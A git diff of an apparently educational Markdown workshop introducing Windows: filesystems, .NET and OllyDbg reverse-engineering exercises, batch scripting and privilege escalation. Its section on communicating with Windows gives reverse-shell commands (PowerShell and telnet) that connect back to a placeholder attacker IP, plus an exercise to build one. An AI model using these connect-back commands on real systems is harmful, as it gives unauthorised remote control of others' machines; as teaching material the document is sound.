@@ -1,12 +1,16 @@
 # Introduction to Windows
 
 ## Table of Contents
+0. Foreword
 1. Windows and Associated Filesystems
 	- 1.1 Windows Basics(?)
 	- 1.2 File Allocation Table (FAT)
 	- 1.3 New Technology File System (NTFS)
 	- 1.4 Resilient File System (ReFS)
 2. Additional Windows Tools
+	- 2.1 Pentesting Tools on Windows
+	- 2.2 .Net Framework
+	- 2.3 Windows Binaries with OllyDbg
 3. Windows Command Prompt
 	- 3.1 Useful Commands
 	- 3.2 Basic Batch File Scripting
@@ -25,8 +29,14 @@
 	- 7.2 ASLR
 	- 7.3 SEHOP
 
+---
+
 ### 0. Foreword
-This document serves as a quick overview of the different aspects of Microsoft Windows. It is by no means comprehensive nor extensive. It just aims to help you take home something new at the end of the document
+This document serves as a quick overview of the different aspects of Microsoft Windows. It is by no means comprehensive nor extensive. It just aims to help you take home something new at the end of the document. If you are attending this live, I will see what I can do additionally on my own Windows installation to demonstration to highlight some poitns.
+
+**It would be best if you have Windows for this introduction!**
+
+---
 
 ### 1. Windows and Associated Filesystems
 
@@ -39,13 +49,14 @@ Enabling **Bash Shell** - If you can't stand CMD/Powershell, you can enable the 
 
 About **Telemetry** - Microsoft collects data from its users. One of the typical ways to go about disabling it is to go the the Group Policy Editor `gpedit.msc` and set the value of "AllowTelemetry" to 0 (i.e. Don't collect). However, it is always important to read the fine print:
 
-Locking Screen - Simply run `rundll32.exe user32.dll, LockWorkStation` to lock someone's computer (i.e. goes to the login screen)
-
-Running scripts - You can use `wscript.exe [SCRIPT JS/VBS]` or `cscript.exe [SCRIPT JS/VBS/C#]` in order to run scripts in different languages
-
 ![](img/telemetry-gpedit.png)
 
 In essence, Microsoft still collect data from the typical PC user because 0 is like 1 :P
+
+*Locking Screen + Fun* - Simply run `rundll32.exe user32.dll, LockWorkStation` to lock someone's computer (i.e. goes to the login screen). Note that `rundll32.exe` allows us to run DLLs (dynamically loaded libraries) as an application, which in this case is `user32.dll`. You can do other stuff with `user32.dll` by referring [here](https://www.autoitscript.com/forum/topic/21848-functions-in-user32dll/)
+
+*Running scripts* - You can use `wscript.exe [SCRIPT JS/VBS]` or `cscript.exe [SCRIPT JS/VBS/C#]` in order to run scripts in different languages
+
 
 #### 1.2 FAT12/FAT16/FAT32/exFAT
 The file allocation table (FAT) system uses a static index table to store an entry for each cluster (indexed), which indicates the entry of the next cluster in the file, EOF, unused disk space and reserved disk space. It can be briefly modelled using the following diagram:
@@ -58,7 +69,7 @@ DATA (CLUSTER) 'A' 'H' 'C' 'G' 'E' 'B' 'S' 'R' 'P'  'Q' '1' 'Y' '3' 'T' '!'
 ```
 Therefore, if we try to check the data starting at index 04, we get "GREYHATS" by following the "ENTRY IN FAT" column in a linked-list fashion.
 
-Question: What is the data starting at index 06?
+**Question**: What is the data starting at index 06?
 
 #### 1.3 NTFS (New Technology FS, started with Windows NT 3.1)
 The new technology file system (NTFS) is currently the more dominant FS used by Windows versions occupying significant market share (e.g. 7/8/8.1/10). We first look at the layout of a formatted NTFS Volume:
@@ -109,14 +120,38 @@ Here are some features MS says about ReFS:
 - *Scalability*: Can support volume sizes up to 2^78 bytes (and up to 2^64 - 1 bytes per file / files per directory)
 ```
 
+---
+
 ### 2. Additional Windows Tools for Security
 
-#### 2.1 Pentesting on Windows
+#### 2.1 Pentesting Tools on Windows
 Normally the pentesting tools we use are typically installed on a Linux system. To try avoiding the hassle of running some VM, you can consider [this](https://tools.pentestbox.org) as a (very) viable alternative.
 
-#### 2.2 Reverse Engineering on Windows
-We
+#### 2.2 .Net Framework
+The .Net Framework is used on Windows. It introduces the Framework Class Library (FCL) and language interoperability across several programming languages (e.g. VB.net, C# ...) In fact we can have a program that is as follows:
 
+![DotNetDecompilerDemo](/img/dotnet.png)
+
+This program can be obtained [here](bin/dotnet.exe) and is written in C#. **Exercise**: try to get yourself validated!
+
+Hint: You can find yourself a .Net decompiler such as [ILSpy](http://ilspy.net) and use it to find the password ;)
+
+After you have completed this exercise, just take note that .Net programs can be obfuscated (i.e. making legible symbols look like something else completely). An example of such a program is [Obfuscar](https://obfuscar.codeplex.com).
+
+#### 2.3 Windows Binaries with OllyDbg
+Windows binaries are typically stored in the Portable Executable (PE) format for both 32 and 64-bit systems. They come in the form of .exe / .dll / .mui etc. An in-depth detail into the structure of the PE format will not be done here.
+
+In order to see what Windows binaries do, one option is to use a debugger such as [OllyDbg](http://www.ollydbg.de) in order to figure out what a binary does. Some common options include:
+
+- *step over*: Go to the next line in current scope
+- *step into*: Descent into function call for current line. Same as step over if it there are no function calls.
+- *step out*: Proceeds until next `return` equivalent
+
+Exercise: Let us try to find the magic number [here](bin/pe.exe) for this 32-bit .exe file. (Time to recall some x86!)
+
+To help you out, you can find where the main function of the program is by using <kbd>Ctrl + G</kbd> and type `main` to locate the main function. Feel free to play around with the program!
+
+---
 
 ### 3. Windows Command Prompt
 The Windows command prompt is normally invoked with certain credentials, we can initialize it as a normal user first (that is ourselves). Simply hit <kbd>Windows + R</kbd> and type `cmd` and press Enter to launch the command prompt.
@@ -299,8 +334,11 @@ ENDLOCAL & SET result=%retval%
 
 Again, this is just a very small program and there are many other methods / functions out there. You may refer to [this link](https://en.wikibooks.org/wiki/Windows_Batch_Scripting) For more details
 
+---
 
 ### 4. Windows Powershell
+
+---
 
 ### 5. Windows Registry
 
@@ -380,6 +418,8 @@ Since we alredy know that `Everyone` has full control of that folder, then placi
 
 A whole other list of possible attacks on different versions of Windows OS can be found [here](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
 
+---
+
 ### 6. Communicating with Windows
 Very often, it is highly annoying to communicate with Windows on remote systems. One possible alternative is to try installing `netcat` and establishing a reverse (TCP) shell. That is, if we are targetting the windows system, we want it to connect back to us:
 ```
@@ -439,6 +479,8 @@ powershell -c 123.45.67.89 -p 9191 -ep
 ```
 Note: use `-ep` for powershell, `-e cmd` for command prompt
 
+**Mini-exercise**: If you have Linux and Windows on your computer, try setting up a reverse shell from your Windows back to your Linux!
+
 #### 6.3 Telnet
 
 Under very obscure situations, you may consider trying telnet despite the need for administrator privileges. To enable it on newer systems (e.g. Windows 10):
@@ -456,6 +498,7 @@ And for the Windows machine (Asssume port 9191):
 telnet 123.45.67.89 9191
 ```
 
+---
 
 ### 7. Windows Protection Mechanisms
 Due to how common buffer overflow attacks might come to one's mind, Microsoft has built in some mitatigation techniques into Windows that help protect memory manipulation by adversaries.
@@ -518,4 +561,4 @@ Many other mitigation techniques (e.g. [Heap Protection](https://blogs.technet.m
 
 ## The End
 
-Thanks for reading through this whole document! :) [Also GitHub Markdown :(]
+Thanks for reading through this whole document, hope you learnt something! :) [Also GitHub Markdown :(]
